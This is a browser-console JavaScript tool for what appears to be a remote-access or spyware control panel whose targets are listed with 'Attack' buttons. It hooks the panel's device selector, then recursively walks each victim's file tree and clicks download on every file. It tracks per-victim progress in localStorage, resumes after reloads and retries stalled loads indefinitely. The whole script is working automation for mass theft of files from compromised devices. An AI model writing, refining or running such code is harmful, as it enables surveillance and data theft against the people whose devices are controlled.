/* ============================================================
   script.js  —  auto-walk + auto-download every file
   Built for the panel where:
     #users          → list of users (each has <button onclick="setdev('xxxx')">Attack</button>)
     div.cr-cmd-name → command tiles ("myfiles" opens the file browser)
     #resp           → folder/file list  (li.fo = folder, li.fi/li.im/li.vi = file, li with text ".." = back)
     #fprev          → file-preview panel containing  <a id="btdwn"> Download File </a>
                       (href is "javascript:void(0);" while loading → "Error",
                        becomes a real firebasestorage URL when ready → "Download File")

   Features
     • Per-user state in localStorage (keyed by setdev id) — never mixes users.
     • Survives net drops / reconnects: every wait retries forever, no give-up.
     • Resumable after page reload: already-downloaded paths are skipped.
     • Re-clicks if a load stalls; auto-closes preview after each download.
   ============================================================ */

(function () {
  if (window.__AUTO_DL_INSTALLED__) return;
  window.__AUTO_DL_INSTALLED__ = true;

  const $  = (s, r = document) => r.querySelector(s);
  const $$ = (s, r = document) => [...r.querySelectorAll(s)];
  const sleep = (ms) => new Promise(r => setTimeout(r, ms));
  const log = (...a) => console.log('%c[AUTO]', 'color:#0bd;font-weight:bold', ...a);
  const warn = (...a) => console.warn('%c[AUTO]', 'color:#fa0;font-weight:bold', ...a);

  /* ------------ per-user state ------------ */
  let DEV = null;                            // current setdev id
  const KEY = (d) => 'autodl::' + d;
  const load = (d) => { try { return JSON.parse(localStorage.getItem(KEY(d))) || { files:{}, dirs:{} }; } catch { return { files:{}, dirs:{} }; } };
  const save = (d, s) => localStorage.setItem(KEY(d), JSON.stringify(s));

  /* hook setdev so we always know which user we're on */
  const _origSetdev = (typeof window.setdev === 'function') ? window.setdev : null;
  try {
    window.setdev = function (id) {
      DEV = id;
      log('user/device =', id);
      if (_origSetdev) return _origSetdev.apply(this, arguments);
    };
  } catch (e) { warn('could not wrap setdev:', e); }

  /* Manual fallback: call pickUser('xxxx') if setdev wrap fails */
  window.pickUser = function (id) { DEV = id; log('user set manually =', id); };

  /* ------------ DOM helpers ------------ */
  function listItems() {
    return $$('#resp > li').map(el => {
      const txt = (el.innerText || '').trim();
      const cls = el.className || '';
      const isBack = txt === '..' || txt.startsWith('..\n') || /^\.\.$/.test(txt.split('\n')[0]);
      const name = isBack ? '..' : (txt.split('\n')[0] || '').trim();
      return {
        el, name, cls, isBack,
        isFolder: !isBack && /\bfo\b/.test(cls),
        isFile:   !isBack && /\b(fi|im|vi|au)\b/.test(cls),
      };
    });
  }
  function respSig() {
    const r = $('#resp'); if (!r) return '0';
    return r.children.length + ':' + (r.innerHTML.length);
  }
  function inBrowser() {
    const r = $('#resp');
    return !!(r && r.offsetParent !== null);   // visible
  }

  /* Wait forever (with periodic re-trigger) until pred() returns truthy */
  async function waitUntil(pred, {tick=500, stallMs=20000, onStall=null, label=''} = {}) {
    let last = Date.now();
    for (;;) {
      try {
        const v = pred();
        if (v) return v;
      } catch {}
      if (Date.now() - last > stallMs) {
        warn('stalled →', label || '(unnamed)');
        if (onStall) { try { await onStall(); } catch {} }
        last = Date.now();
      }
      await sleep(tick);
    }
  }

  /* ------------ navigation ------------ */
  const PATH = [];                                   // folder name stack
  const cwd = () => '/' + PATH.join('/');

  async function enterFolder(item) {
    const sig = respSig();
    item.el.click();
    await waitUntil(
      () => respSig() !== sig && inBrowser(),
      { label: 'enter ' + item.name, stallMs: 25000,
        onStall: () => item.el.click() }
    );
    PATH.push(item.name);
    log('cd →', cwd());
    await sleep(250);
  }

  async function goBack() {
    const back = listItems().find(i => i.isBack);
    if (!back) return false;
    const sig = respSig();
    back.el.click();
    await waitUntil(
      () => respSig() !== sig && inBrowser(),
      { label: 'back from ' + cwd(), stallMs: 25000,
        onStall: () => back.el.click() }
    );
    PATH.pop();
    log('cd ←', cwd());
    await sleep(250);
    return true;
  }

  /* ------------ download one file ------------ */
  async function downloadFile(item) {
    const state = load(DEV);
    const key = cwd() + '/' + item.name;
    if (state.files[key]) { log('skip', key); return; }

    log('open file', key);
    const sig = respSig();
    item.el.click();

    // Wait for preview + a real download href (not the "Error" placeholder).
    const link = await waitUntil(() => {
      const fp = $('#fprev');
      if (!fp || fp.style.display === 'none') return null;
      const a = $('#btdwn');
      if (!a) return null;
      const href = a.getAttribute('href') || '';
      const txt  = (a.textContent || '').trim().toLowerCase();
      if (!href || href.startsWith('javascript:')) return null;
      if (txt === 'error') return null;
      return a;
    }, {
      label: 'btdwn ready for ' + key,
      stallMs: 30000,
      onStall: async () => {
        // close + re-open the file to force a fresh fetch
        const fp = $('#fprev'); if (fp) fp.style.display = 'none';
        await sleep(400);
        item.el.click();
      }
    });

    log('click ⇩', key, '→', link.href.slice(0, 80) + '…');
    link.click();

    // Mark done immediately so a refresh resumes correctly.
    const st2 = load(DEV);
    st2.files[key] = Date.now();
    save(DEV, st2);

    await sleep(900);                           // let the upload-to-your-bucket fire
    const fp = $('#fprev'); if (fp) fp.style.display = 'none';

    // After closing preview the file list should still be intact; if it isn't, wait.
    await waitUntil(() => inBrowser() && $$('#resp > li').length > 0,
                    { label: 'list back after close', stallMs: 15000 });
    await sleep(200);
  }

  /* ------------ recursive walk ------------ */
  async function walk() {
    for (;;) {
      const state = load(DEV);
      const list  = listItems();

      // pick first unprocessed item (folder or file)
      const next = list.find(it => {
        if (it.isBack) return false;
        const k = cwd() + '/' + it.name;
        if (it.isFolder) return !state.dirs[k];
        if (it.isFile)   return !state.files[k];
        return false;
      });

      if (!next) return;                        // folder exhausted

      if (next.isFolder) {
        await enterFolder(next);
        await walk();                           // recurse
        const s = load(DEV);
        s.dirs[cwd()] = Date.now();
        save(DEV, s);
        if (PATH.length > 0) await goBack();
      } else {
        try { await downloadFile(next); }
        catch (e) { warn('file error', e); await sleep(2500); }
      }
    }
  }

  /* ------------ public commands ------------ */
  window.startAuto = async function () {
    if (!DEV) { warn('No user selected. Click a user\'s "Attack" button first.'); return; }
    if (!inBrowser()) { warn('Open "myfiles" first (click the myfiles command).'); return; }
    PATH.length = 0;
    log('▶ start for user', DEV);
    try { await walk(); log('✅ finished for user', DEV); }
    catch (e) { warn('fatal', e); }
  };

  window.resetAuto = function () {
    if (!DEV) { warn('no user'); return; }
    localStorage.removeItem(KEY(DEV));
    log('state cleared for', DEV);
  };

  window.statusAuto = function () {
    if (!DEV) return console.log('no user');
    const s = load(DEV);
    console.log('user', DEV,
      '| files done:', Object.keys(s.files).length,
      '| dirs done:', Object.keys(s.dirs).length);
  };

  log('ready. flow → 1) click Attack on a user  2) click myfiles  3) run  startAuto()');
  log('other commands:  statusAuto()   resetAuto()');
})();
